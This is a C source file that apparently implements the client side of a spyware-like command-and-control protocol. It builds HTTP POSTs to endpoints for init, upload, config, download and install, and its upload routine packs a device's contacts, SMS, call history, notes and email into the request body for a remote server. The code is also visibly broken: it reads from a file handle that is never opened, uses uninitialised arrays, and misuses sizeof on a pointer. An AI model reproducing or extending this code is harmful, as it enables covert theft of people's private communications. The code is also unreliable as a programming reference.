#include "http_request.h"

int construct_http(const char *IpAddress, u_short Port, int PostAction, char *SendBuffer, char *FilePathName, int UPLOAD_TYPE){
	char HttpHeader[SOCKET_MAX_BUF];
	int HttpHeaderLen = 0, HttpContentLen = 0;

	memset(SendBuffer, 0x00, sizeof SendBuffer);
	memset(HttpHeader, 0x00, sizeof HttpHeader);

	HttpContentLen = construct_http_content(PostAction, SendBuffer, FilePathName, UPLOAD_TYPE);
	HttpHeaderLen = construct_http_header(IpAddress, Port, PostAction, HttpHeader, HttpContentLen);

	memmove(SendBuffer + HttpHeaderLen, SendBuffer, HttpContentLen);
	memcpy(SendBuffer, HttpHeader, HttpHeaderLen);

	return 0;
}

int construct_http_header(const char *IpAddress, u_short Port, int PostAction, char *HttpHeader, int HttpContentLen){
	char HttpContentLenString[MARK_MAX_BUF];
	int len = 0;

	sprintf(HttpContentLenString, "%d", HttpContentLen);

	switch(PostAction){
	case POST_API_ACTION_INIT:
		strcat(HttpHeader, "POST /api/init");
		break;
	case POST_API_ACTION_UPLOAD:
		strcat(HttpHeader, "POST /api/upload");
		break;
	case POST_API_ACTION_COMM:
		strcat(HttpHeader, "POST /api/comm");
		break;
	case POST_API_ACTION_CONFIG:
		strcat(HttpHeader, "POST /api/config");
		break;
	case POST_API_ACTION_DOWNLOAD:
		strcat(HttpHeader, "POST /api/download");
		break;
	case POST_API_ACTION_INSTALL:
		strcat(HttpHeader, "POST /api/install");
		break;
	}

	strcat(HttpHeader, " HTTP/1.1\r\n");
	strcat(HttpHeader, "Host: ");
	strcat(HttpHeader, IpAddress);
	strcat(HttpHeader, "\r\n");
	strcat(HttpHeader, "Accept: */*\r\n");
	strcat(HttpHeader, "Content-Length: ");
	strcat(HttpHeader, HttpContentLenString);
	strcat(HttpHeader, "\r\n");

	strcat(HttpHeader, "\r\n");

	len = strlen(HttpHeader);
	return len;
}

int construct_http_content(int PostAction, char *SendBuffer, char *FilePathName, int UPLOAD_TYPE){

	char HttpContentHeader[SOCKET_MAX_BUF];
	int HttpContentHeaderLen = 0, HttpContentLen = 0;

	memset(HttpContentHeader, 0x00, sizeof HttpContentHeader);

	HttpContentHeaderLen = construct_http_content_header(PostAction, HttpContentHeader);
	
	strcat(SendBuffer, "{\r\n");
	strcat(SendBuffer, HttpContentHeader);

	switch(PostAction){
	case POST_API_ACTION_INIT:
		construct_http_content_init(SendBuffer);
		break;
	case POST_API_ACTION_UPLOAD:
		construct_http_content_upload(SendBuffer, FilePathName, UPLOAD_TYPE);
		break;
	case POST_API_ACTION_COMM:
		break;
	case POST_API_ACTION_CONFIG:
		break;
	case POST_API_ACTION_DOWNLOAD:
		break;
	case POST_API_ACTION_INSTALL:
		break;
	}

	strcat(SendBuffer, "}");

	HttpContentLen = change_to_bson_number(SendBuffer);

	return HttpContentLen;
}

int construct_http_content_header(int PostAction, char *HttpContentHeader){
	/*
	0:	GUID
	1:	VER
	2:	SOURCE
	3:	ACTION
	4:	NONCE
	5:	SIG
	*/
	char MarkName[MARK_MAX_NUMBER][MARK_MAX_BUF] = {"devid", "ver", "source", "action", "nonce", "sig"};
	char Mark[MARK_MAX_NUMBER][MARK_MAX_BUF];

	int i = 0;
	int len = 0;

	switch(PostAction){
	case POST_API_ACTION_INIT:
		strcpy(Mark[3], "101");
		break;
	case POST_API_ACTION_UPLOAD:
		strcpy(Mark[3], "111");
		break;
	case POST_API_ACTION_COMM:
		strcpy(Mark[3], "121");
		break;
	case POST_API_ACTION_CONFIG:
		strcpy(Mark[3], "122");
		break;
	case POST_API_ACTION_DOWNLOAD:
		strcpy(Mark[3], "123");
		break;
	case POST_API_ACTION_INSTALL:
		strcpy(Mark[3], "124");
		break;
	}
	
	for(i = 0; i < MARK_MAX_NUMBER; i ++){
		strcat(HttpContentHeader, MarkName[i]);
		strcat(HttpContentHeader, ":");
		strcat(HttpContentHeader, Mark[i]);
		strcat(HttpContentHeader, ",\r\n");
	}

	len = strlen(HttpContentHeader);
	return len;
}

int construct_http_content_init(char *SendBuffer){
	char UID[MARK_MAX_BUF];
	char SECRETKEY[MARK_MAX_BUF];

	strcat(SendBuffer, "uid:{");
	strcat(SendBuffer, UID);
	strcat(SendBuffer, "}\r\n");
}

int construct_http_content_upload(char *SendBuffer, char *FilePathName, int UPLOAD_TYPE){
	FILE * PFile = NULL;
	char InBuffer[SOCKET_MAX_BUF];
	memset(InBuffer, 0x00, sizeof InBuffer);

	strcat(SendBuffer, "data:[{");

	strcat(SendBuffer, "id:{");
	strcat(SendBuffer, "1");
	strcat(SendBuffer, "},\r\n");

	switch(UPLOAD_TYPE){
	case UPLOAD_TYPE_CONTACT:
	case UPLOAD_TYPE_SMS:
	case UPLOAD_TYPE_CALLHISTORY:
	case UPLOAD_TYPE_NOTES:
	case UPLOAD_TYPE_EMAIL:
		strcat(SendBuffer, "typeid:{105},\r\ndata:{");
		while(fgets(InBuffer, SOCKET_MAX_BUF, PFile)){
			strcat(SendBuffer, InBuffer);
		}
		strcat(SendBuffer, "},\r\n");
	}

	strcat(SendBuffer, "},\r\n]\r\n");
}